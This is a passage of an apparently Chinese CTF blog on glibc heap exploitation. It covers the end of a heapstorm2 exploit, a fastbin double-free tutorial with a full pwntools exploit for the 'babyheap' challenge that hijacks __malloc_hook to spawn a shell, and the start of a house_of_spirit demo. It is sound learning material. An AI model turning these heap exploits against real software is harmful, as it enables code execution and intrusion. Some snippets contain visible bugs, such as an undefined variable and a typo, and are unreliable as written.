class="number">0x13370800</span>)</span><br><span class="line">        update(<span class="number">2</span>,p2)</span><br><span class="line">        p3=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x13377331</span>)+p64(<span class="number">0x13370800</span>)</span><br><span class="line">        p3+=p64(<span class="number">0x1000</span>)+p64(fake_chunk+<span class="number">3</span>)+p64(<span class="number">8</span>)</span><br><span class="line">        update(<span class="number">0</span>,p3)</span><br><span class="line">        show(<span class="number">1</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;]: &#x27;</span>)</span><br><span class="line">        heap=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line">        p3=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x13377331</span>)+p64(<span class="number">0x13370800</span>)</span><br><span class="line">        p3+=p64(<span class="number">0x1000</span>)+p64(heap+<span class="number">0x10</span>)+p64(<span class="number">8</span>)</span><br><span class="line">        update(<span class="number">0</span>,p3)</span><br><span class="line">        show(<span class="number">1</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;]: &#x27;</span>)</span><br><span class="line">        hook_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-<span class="number">0x10</span></span><br><span class="line">        libc_base=hook_base-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">        free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">        p3=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x13377331</span>)+p64(<span class="number">0x13370800</span>)</span><br><span class="line">        p3+=p64(<span class="number">0x1000</span>)+p64(free_hook)+p64(<span class="number">0x8</span>)</span><br><span class="line">        update(<span class="number">0</span>,p3)</span><br><span class="line">        update(<span class="number">1</span>,p64(ogg[<span class="number">1</span>]+libc_base))</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        sh.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sh = process(<span class="string">&#x27;./heapstorm2&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/17/Fastbin-Attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/11/17/Fastbin-Attack/" class="post-title-link" itemprop="url">Fastbin Attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-11-17 17:18:02" itemprop="dateCreated datePublished" datetime="2021-11-17T17:18:02+08:00">2021-11-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-11-18 21:41:44" itemprop="dateModified" datetime="2021-11-18T21:41:44+08:00">2021-11-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h2><p>原理：fastbin是单链表，当一个堆被释放到fastbin时，他会被插入到链表的头结点，但是不会释放size的p位，意思就是被释放了但是p仍然为1，这就对判断堆是否被释放带来了麻烦，而这一点就是我们要利用的漏洞</p>
<p>Fastbin Attack分为好几种攻击方式，下面来一一介绍</p>
<h3 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h3><p>如其名就是一个fast大小的堆被释放了两次</p>
<p>能成功的原因主要还是上面的原理，一个是p不会被置0，一个是fastbins判断堆是否空闲的机制，他只会检查头结点的堆是不是和要释放的是一个堆，如果是那就错误，如果不是，那就判断他不是空闲堆，插入头结点。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利用姿势</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">mall0c(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>上面伪代码把1释放了两次，但是程序并不会报错，因为当第二次释放1时，他会检查要释放到的链表的头结点是不是1,此时头结点是2，不是1，那就判断1不是空闲堆，那就释放。</p>
<p>最后的链表结构</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20211117151105924.png" alt="image-20211117151105924"></p>
<p>那free两次后能干啥呢，按我的理解就是让多个指针指向了同一个堆，可以实现就算堆是空闲也能写入数据（如果存在ufa就不用这个麻烦了）,最主要就是能覆盖fd了。能覆盖fd就能实现向任意地址申请堆了。</p>
<p>下面是例题</p>
<p>这道例题是我刚开始学pwn的时候做的，以前觉得这道题好难啊，现在看来好像没那么难理解了，这段时间的学习果然有用啊😁😁</p>
<p>下面是伪代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_B70(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_CF4();</span><br><span class="line">    <span class="keyword">switch</span> ( sub_138C() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        sub_D48(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        sub_E7F(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        sub_F50(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        sub_1051(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_D48</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">24LL</span> * i + a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      v2 = sub_138C();</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">          v2 = <span class="number">4096</span>;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(v2, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *(_DWORD *)(<span class="number">24LL</span> * i + a1) = <span class="number">1</span>;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">8</span>) = v2;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">16</span>) = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocate Index %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_E7F</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">24LL</span> * (<span class="keyword">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      result = sub_138C();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">        result = sub_11B2(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_F50</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">24LL</span> * (<span class="keyword">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(<span class="number">24LL</span> * v2 + a1) = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>) = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>));</span><br><span class="line">      result = <span class="number">24LL</span> * v2 + a1;</span><br><span class="line">      *(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_1051</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_DWORD *)(<span class="number">24LL</span> * result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      sub_130F(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>));</span><br><span class="line">      result = <span class="built_in">puts</span>(byte_14F1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Allocate&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Fill&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Free&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. Dump&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. Exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Command: &quot;</span>);</span><br></pre></td></tr></table></figure>

<p>通过输出就可以知道这个程序的大致功能了，通过free可知没有ufa了。</p>
<p>漏洞利用思路：</p>
<p>​    1.暴露libc基地址，如果unsorted bin只有一个堆时，那这个堆的fd和bk都储存着main_arena+88地址，我们可以知道main_arena的偏移量，那就能知道libc基地址了。</p>
<p>​    2.设置malloc_hook出的值为one_gadget,这是因为每次malloc的时候他都会检查malloc_hook处的值，如果为空那继续执行malloc,如果是一个地址的话，那就跳到这个地址处执行这里面的代码。</p>
<p>因为没有ufa,所以得制造多个指针指向unsorted chunk才能在被释放时读到fd.就我目前知道的方式有两种，一种是double free(没必要)，一个是堆溢出直接改fd就行了，注意malloc分配bins上的堆时会检查申请的堆大小和要分配的堆大小是否相等，如果相等才可以分配。</p>
<p>然后就是把堆分配到maolloc_hook附近，这个比较简单，主要是注意构造size，J就是在malloc_hook附近选择合适的size来fake chunk，不然不能通过分配。</p>
<p>下面是payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    p = process(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>():</span></span><br><span class="line"><span class="comment">#    gdb.attach(p)</span></span><br><span class="line">    alloc(<span class="number">0x60</span>)</span><br><span class="line">    alloc(<span class="number">0x40</span>)</span><br><span class="line">    fill(<span class="number">0</span>, <span class="number">0x60</span> + <span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">    alloc(<span class="number">0x100</span>)</span><br><span class="line">    fill(<span class="number">2</span>, <span class="number">0x20</span>, <span class="string">&#x27;c&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    alloc(<span class="number">0x60</span>)</span><br><span class="line">    fill(<span class="number">1</span>, <span class="number">0x40</span> + <span class="number">0x10</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line">    alloc(<span class="number">0x50</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    leaked = u64(dump(<span class="number">1</span>)[-<span class="number">8</span>:])</span><br><span class="line">    <span class="comment"># return libc_base</span></span><br><span class="line">    <span class="keyword">return</span> leaked - <span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fastbin_attack</span>(<span class="params">libc_base</span>):</span></span><br><span class="line">    malloc_hook = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] + libc_base</span><br><span class="line">    execve_addr = <span class="number">0x4526a</span> + libc_base</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;malloc_hook @&quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">    log.info(<span class="string">&quot;system_addr @&quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">27</span> - <span class="number">0x8</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    fill(<span class="number">0</span>, <span class="number">0x60</span> + <span class="number">0x10</span> + <span class="number">0x10</span>, payload)</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x60</span>)</span><br><span class="line">    alloc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    payload  = p8(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    payload  = p64(execve_addr)</span><br><span class="line">    fill(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    alloc(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="comment">#    pwnlib.gdb.attach(p)</span></span><br><span class="line">    libc_base = leak()</span><br><span class="line">    log.info(<span class="string">&quot;get libc_base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    fastbin_attack(libc_base)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><p>不曾设想的道路</p>
<p>double free的利用方式是修改fd指向fake_chunk,这个house_of_spirit是先伪造fake chunk,然后让一个指针指向这个堆，假设这个指针为a，然后free(a),fake_chunk就进入了bin了，然后再申请fake_chunk大小的堆就申请到了fake_chunk,然后就可以往这个堆里写入数据。</p>
<p>但这个利用方式也有限制条件</p>
<ul>
<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>（64位是8字节，32位是4字节），同时也不能大于<code>av-&gt;system_mem</code> （没查到）。</li>
<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
</ul>
<p>最主要的就是next_chunk-&gt;size的绕过。</p>
<p>可以通过how2heap体会利用过程</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, <span class="string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);</span><br><span class="line"></span><br><span 